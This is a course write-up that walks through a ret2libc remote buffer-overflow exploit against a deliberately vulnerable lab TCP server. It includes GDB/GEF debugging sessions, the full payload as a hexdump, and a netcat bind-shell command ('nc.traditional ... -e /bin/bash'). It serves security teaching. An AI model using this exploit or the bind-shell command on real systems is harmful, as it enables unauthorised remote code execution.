# Remote buffer overflow exploit (ASLR/DEP/64bit)

## Introduction

We will create a functional remote exploit for a 64 bit server with a stack overflow vulnerability and enabled ASLR and DEP.

We will be using ret2libc technique, to call `system()` in LIBC instead of shellcode directly, and using bash shellcode. 


## Source

* Source directory: `~/challenges/challenge15/`
* Source files: [challenge15](https://github.com/dobin/yookiterm-challenges-files/tree/master/challenge15)

You can compile it by calling `make` in the folder `~/challenges/challenge15`

The source is basically identical to challenge13. A TCP/IP server with a buffer overflow. The difference is a function `notcalled()`
and a `memcpy()` in `handleData()` to make the exercise easier
to solve.


### Vulnerability

The vulnerability lies here:

```
void handleData(char *username, char *password) {
    char name[256];
    ...
    strcpy(name, username);
    ...
}

void handleClient (int socket) {
   char username[1024];
   char password[1024];

   read(socket, username, 1023);
   read(socket, password, 1023);

   int ret = handleData(username, password);
   ...
}
```

The vulnerability is identical to challenge13.


### Usage

The server expects two messages - similar to challenge12, but this time they
are not read via stdin, but from a TCP/IP socket:

```sh
$ nc localhost 5001
Username: test
Password: test
Not admin.
```


## Exploit

Instead of pointing our SIP (return address) to the shellcode, we will
instead point it to the addres of the function `system()` in LIBC: 

```
NAME
       system - execute a shell command

SYNOPSIS
       #include <stdlib.h>

       int system(const char *command);

DESCRIPTION
       The  system() library function uses fork(2) to create a child process that executes
       the shell command specified in command using execl(3) as follows:

           execl("/bin/sh", "sh", "-c", command, (char *) NULL);
```


So we need the address of `system()`. Lets start the program, 
stop it at any location, and use the GEF command `got` to print the GOT:
```
~/challenges/challenge15$ python3 challenge15-solution.py --offset 280
Dont forget to start the server in the background
[+] Opening connection to localhost on port 5001: Done
[*] running in new terminal: ['/usr/bin/gdb', '-q', '/root/challenges/challenge15/challenge15', '8859', '-x', '/tmp/pwn1xjvqp98.gdb']
[+] Waiting for debugger: Done
--[ Send pattern
...

─────────────────────────────────────────────────────────────────────────────────────────────
$rbx   : 0x0
$rcx   : 0xf000000000000000
$rdx   : 0x3c
$rsp   : 0x007ffde62e4610  →  0x007f8800000040 ("@"?)
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x0
$rdi   : 0x007ffde62e4a20  →  "XXXXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rip   : 0x42424242
──────────────────────────────────────────────────────────────────────────── code:x86:64 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
──────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "challenge15", stopped 0x42424242 in ?? (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────

gef➤  got

GOT protection: Partial RelRO | GOT functions: 19

[0x404018] strcpy@GLIBC_2.2.5  →  0x7f88c08d4580
[0x404020] puts@GLIBC_2.2.5  →  0x7f88c08a85f0
[0x404028] write@GLIBC_2.2.5  →  0x7f88c0920f20
[0x404030] strlen@GLIBC_2.2.5  →  0x7f88c08cf820
[0x404038] system@GLIBC_2.2.5  →  0x401076
[0x404040] htons@GLIBC_2.2.5  →  0x7f88c093f740
[0x404048] printf@GLIBC_2.2.5  →  0x7f88c0888cf0
[0x404050] close@GLIBC_2.2.5  →  0x7f88c09216b0
[0x404058] read@GLIBC_2.2.5  →  0x7f88c0920e80
[0x404060] strcmp@GLIBC_2.2.5  →  0x7f88c08c6c30
[0x404068] signal@GLIBC_2.2.5  →  0x7f88c086db60
[0x404070] listen@GLIBC_2.2.5  →  0x7f88c0930fa0
[0x404078] bind@GLIBC_2.2.5  →  0x7f88c0930e40
[0x404080] perror@GLIBC_2.2.5  →  0x401106
[0x404088] accept@GLIBC_2.2.5  →  0x7f88c0930da0
[0x404090] exit@GLIBC_2.2.5  →  0x401126
[0x404098] crypt@XCRYPT_2.0  →  0x7f88c0a0cae0
[0x4040a0] fork@GLIBC_2.2.5  →  0x7f88c08fd470
[0x4040a8] socket@GLIBC_2.2.5  →  0x7f88c0931470
gef➤
```

As we can see, the address of `system@GLIBC` is `0x401076`.

We can investigate the memory region with the command `vmmap`:
```
gef➤  vmmap
Start              End                Offset             Perm Path
0x00000000400000 0x00000000401000 0x00000000000000 r-- /root/challenges/challenge15/challenge
15
0x00000000401000 0x00000000402000 0x00000000001000 r-x /root/challenges/challenge15/challenge
15
0x00000000402000 0x00000000403000 0x00000000002000 r-- /root/challenges/challenge15/challenge15
0x00000000403000 0x00000000404000 0x00000000002000 r-- /root/challenges/challenge15/challenge15
0x00000000404000 0x00000000405000 0x00000000003000 rw- /root/challenges/challenge15/challenge15
...
```

I also inserted a system() function call in a function which never gets called. We can deduct the address of `system@plt` from the disassembly too:
```
gef➤  disas notcalled
Dump of assembler code for function notcalled:
   0x0000000000401242 <+0>:     push   rbp
   0x0000000000401243 <+1>:     mov    rbp,rsp
   0x0000000000401246 <+4>:     mov    edi,0x402008
   0x000000000040124b <+9>:     call   0x401070 <system@plt>
   0x0000000000401250 <+14>:    nop
   0x0000000000401251 <+15>:    pop    rbp
   0x0000000000401252 <+16>:    ret
End of assembler dump.
gef➤
```

`call   0x401070 <system@plt>` shows us the precise memory
location.


## Shellcode

`system()` executes a bash command line. Lets keep it simple and use netcat as a listener bind shell:

```
nc.traditional -nlp 4444 127.0.0.1 -e /bin/bash #
```

Dont forget the trailing `#` to comment-out garbage from the stack.


## Exploit

Example of a successful exploit:
```
~/challenges/challenge15$ python3 challenge15-solution.py --offset 280 --address 0x401076 NOPTRACE
Dont forget to start the server in the background
[+] Opening connection to localhost on port 5001: Done
[!] Skipping debug attach since context.noptrace==True
--[ Send exploit
00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
00000010  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
00000020  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
00000030  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
00000040  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
00000050  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
00000060  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
00000070  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
00000080  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
00000090  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
000000a0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
000000b0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
000000c0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 6e  │    │    │    │   n│
000000d0  63 2e 74 72  61 64 69 74  69 6f 6e 61  6c 20 2d 6e  │c.tr│adit│iona│l -n│
000000e0  6c 70 20 34  34 34 34 20  31 32 37 2e  30 2e 30 2e  │lp 4│444 │127.│0.0.│
000000f0  31 20 2d 65  20 2f 62 69  6e 2f 62 61  73 68 20 23  │1 -e│ /bi│n/ba│sh #│
00000100  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000110  41 41 41 41  41 41 41 41  76 10 40 00  00 00 00 00  │AAAA│AAAA│v·@·│····│
00000120
[+] Opening connection to 127.0.0.1 on port 4444: Done
[*] Switching to interactive mode
$ ls
Makefile
challenge15
challenge15-solution.py
challenge15.c
```


## Analysis

We just give the target the address of `system()` - but how does it know where our shellcode is? What's its argument?

Remember, the function call convention is:
```
RDI, RSI, RDX, RCX, R8, R9
```

So we can check what's the contest of `RDI` before `ret`, 
by setting a breakpoint before returning:

```
~/challenges/challenge15$ python3 challenge15-solution.py --offset 280 --gdb 'break *handleData+109'
Dont forget to start the server in the background
[+] Opening connection to localhost on port 5001: Done
[*] running in new terminal: ['/usr/bin/gdb', '-q', '/root/challenges/challenge15/challenge15', '9688', '-x', '/tmp/pwnom_ajpnv.gdb']
[+] Waiting for debugger: Done
--[ Send pattern
00000000  58 58 58 58  41 41 41 41  41 41 41 41  41 41 41 41  │XXXX│AAAA│AAAA│AAAA│
00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000020  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000030  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000040  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000050  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000060  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000070  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000080  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000090  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
000000a0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
000000b0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
000000c0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
000000d0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
000000e0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
000000f0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000100  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000110  41 41 41 41  41 41 41 41  42 42 42 42               │AAAA│AAAA│BBBB│
0000011c
[▗] Receiving all data: 0B

─────────────────────────────────────────────────────────────────────────────────────────────
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────── source:challenge15.c+43 ────
     40     } else {
     41        return 0;
     42     }
 →   43  }
     44
     45  void handleClient (int socket) {
     46     char username[1024];
────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x1
$rbx   : 0x0
$rcx   : 0xffffffff00000000
$rdx   : 0xc
$rsp   : 0x007ffef7b3e658  →  0x00000042424242 ("BBBB"?)
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0xf000
$rdi   : 0x007ffef7b3ea70  →  "XXXXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rip   : 0x0000000040130e  →  <handleData+109> ret
──────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40130d <handleData+108> leave
 →   0x40130e <handleData+109> ret
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "challenge15", stopped 0x40130e in handleData (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────
gef➤  i r rdi
rdi            0x7ffef7b3ea70      0x7ffef7b3ea70
gef➤  x/1s $rdi
0x7ffef7b3ea70: "XXXX", 'A' <repeats 276 times>, "BBBB"
gef➤

```

`RDI` points to a string which is our username, and shellcode. 

How convenient!

## Tipps 

You may need to clean up after your previous exploit attempts. 

```
~/challenges/challenge15$ ps axw
    PID TTY      STAT   TIME COMMAND
      1 ?        Ss     0:00 /sbin/init
     60 ?        Ss     0:00 /lib/systemd/systemd-journald
     84 ?        Ssl    0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/l
    110 ?        Ss     0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-onl
    112 ?        Ss     0:00 /lib/systemd/systemd-logind
    115 pts/0    Ss+    0:00 /sbin/agetty -o -p -- \u --noclear --keep-baud console 115200,38400,9600 linux
    124 pts/1    Ss+    0:00 bash
   1010 ?        Rs     4:28 tmux
   8003 pts/2    Ss     0:00 bash
   8004 pts/2    S+     0:00 tmux a
   8851 pts/4    Ss     0:00 -bash
   8884 pts/5    Ss     0:00 -bash
   9140 pts/5    S+     0:00 vi challenge15-solution.py
   9590 pts/6    Ss     0:00 -bash
   9597 pts/4    S+     0:00 ./challenge15
   9710 ?        Zs     0:00 [gdb] <defunct>
   9728 pts/4    S+     0:00 ./challenge15
   9729 pts/4    S+     0:00 sh -c                                                           
   9730 pts/4    S+     0:00 nc.traditional -nlp 4444 127.0.0.1 -e /bin/bash
   9746 pts/6    R+     0:00 ps axw
```

Troublesome processes may include 9710, 9728 and 9730.

May need to `pkill -9 nc.traditional`, and/or `gdb`, `challenge15`, and more. 


## Things to think about

* The address of `system()` via disassembly is `0x401070`, while from the GEF `got` command is `0x401076`. Both seem to work. Whats the correlation?
